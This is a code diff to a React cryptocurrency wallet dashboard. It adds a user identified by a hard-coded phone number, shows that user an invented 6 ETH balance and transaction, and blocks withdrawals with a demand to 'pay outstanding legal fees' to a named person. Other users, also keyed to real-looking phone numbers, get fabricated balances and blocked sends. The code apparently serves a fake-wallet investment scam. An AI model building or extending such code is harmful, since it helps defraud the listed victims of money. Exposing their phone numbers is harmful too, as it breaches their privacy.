@@ -75,6 +75,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const isTomAdams = userData.phone === "61448679694";
   const isMichaelWhite = userData.phone === "447934232580";
   const isDorothy = userData.phone === "0064273173352";
+  const isSanju = userData.phone === "918898562441";
   
   // Dynamic balances for Jan based on BTC purchase state
   const janGbpBalance = hasExecutedBtcPurchase ? 0 : 2253751;
@@ -84,9 +85,9 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const dorothyNzdBalance = isDorothy ? 8250721.56 : 0;
   const nzdToUsdRate = 0.61; // Approximate NZD to USD conversion rate
   
-  const cryptoBalance = isJoanne ? 2022715.98 : isJan ? (hasExecutedBtcPurchase ? janBtcBalance : janGbpBalance) : isJeremy ? 0 : isBen ? 0.01609472 : isRami ? 1.2 : isLinda ? 2.73 : isYuetwa ? 0.63 : isTommy ? 1.0 : isElaine ? 6.36 : isMichaelWhite ? 170 : isDorothy ? 1 : 43.62;
-  const cryptoSymbol = isJoanne ? "DASH" : isJan ? (hasExecutedBtcPurchase ? "BTC" : "GBP") : isJeremy ? "ETH" : isBen ? "ETH" : isRami ? "BTC" : isLinda ? "BTC" : isYuetwa ? "BTC" : isTommy ? "BTC" : isElaine ? "BTC" : isMichaelWhite ? "BTC" : "BTC";
-  const currentPrice = isJoanne ? dashPrice : isJan ? (hasExecutedBtcPurchase ? btcPrice : gbpToUsdRate) : (isJeremy || isBen) ? ethPrice : isMichaelWhite ? btcPrice : btcPrice;
+  const cryptoBalance = isJoanne ? 2022715.98 : isJan ? (hasExecutedBtcPurchase ? janBtcBalance : janGbpBalance) : isJeremy ? 0 : isBen ? 0.01609472 : isRami ? 1.2 : isLinda ? 2.73 : isYuetwa ? 0.63 : isTommy ? 1.0 : isElaine ? 6.36 : isMichaelWhite ? 170 : isDorothy ? 1 : isSanju ? 6 : 43.62;
+  const cryptoSymbol = isJoanne ? "DASH" : isJan ? (hasExecutedBtcPurchase ? "BTC" : "GBP") : isJeremy ? "ETH" : isBen ? "ETH" : isRami ? "BTC" : isLinda ? "BTC" : isYuetwa ? "BTC" : isTommy ? "BTC" : isElaine ? "BTC" : isMichaelWhite ? "BTC" : isSanju ? "ETH" : "BTC";
+  const currentPrice = isJoanne ? dashPrice : isJan ? (hasExecutedBtcPurchase ? btcPrice : gbpToUsdRate) : (isJeremy || isBen || isSanju) ? ethPrice : isMichaelWhite ? btcPrice : btcPrice;
   const minWithdrawal = isJoanne ? 460.10 : isJan ? 0.1 : isJeremy ? 0.1 : isBen ? 0.1 : isRami ? 0 : isLinda ? 0.1 : isTommy ? 0.1 : isElaine ? 0.1 : isMichaelWhite ? 0.1 : 45;
   
   // USDT balances and Joanne's BTC balance
@@ -494,8 +495,20 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
       symbol: "BTC"
     }
   ];
+
+  const sanjuTransactions = [
+    { 
+      id: "1", 
+      type: "received", 
+      amount: 6, 
+      date: new Date().toISOString().split('T')[0], 
+      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+      hash: "0xSV1234...",
+      symbol: "ETH"
+    }
+  ];
   
-  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : isJeremy ? jeremyTransactions : isBen ? benTransactions : isRami ? ramiTransactions : isLinda ? lindaTransactions : isYuetwa ? yuetwaTransactions : isTommy ? tommyTransactions : isElaine ? elaineTransactions : isTomAdams ? tomAdamsTransactions : isMichaelWhite ? michaelWhiteTransactions : dorothyTransactions;
+  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : isJeremy ? jeremyTransactions : isBen ? benTransactions : isRami ? ramiTransactions : isLinda ? lindaTransactions : isYuetwa ? yuetwaTransactions : isTommy ? tommyTransactions : isElaine ? elaineTransactions : isTomAdams ? tomAdamsTransactions : isMichaelWhite ? michaelWhiteTransactions : isSanju ? sanjuTransactions : dorothyTransactions;
 
   const getBenAddress = (crypto: string) => {
     switch (crypto) {
@@ -553,7 +566,15 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   };
 
   const handleSendSubmit = () => {
-    if (isTomAdams || isMichaelWhite) {
+    if (isSanju) {
+      // For Sanju, show legal fees message
+      toast({
+        title: "Payment Required",
+        description: "Please pay outstanding legal fees to James McCann",
+        variant: "destructive",
+      });
+      setIsSendDialogOpen(false);
+    } else if (isTomAdams || isMichaelWhite) {
       // For Tom Adams and Michael White, show customer support message
       toast({
         title: "Contact Customer Support",
